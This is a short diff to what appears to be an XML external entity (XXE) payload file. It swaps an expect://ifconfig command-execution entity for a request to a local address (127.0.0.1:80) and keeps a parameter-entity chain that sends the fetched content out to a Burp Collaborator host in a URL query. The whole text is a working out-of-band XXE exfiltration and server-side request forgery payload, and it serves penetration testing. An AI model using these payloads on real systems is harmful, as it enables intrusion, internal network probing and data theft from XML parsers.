@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "expect://ifconfig">
+<!ENTITY % file SYSTEM "http://127.0.0.1:80/">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://udblu46vhxhfcolde6ib3zeublhg55.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate;
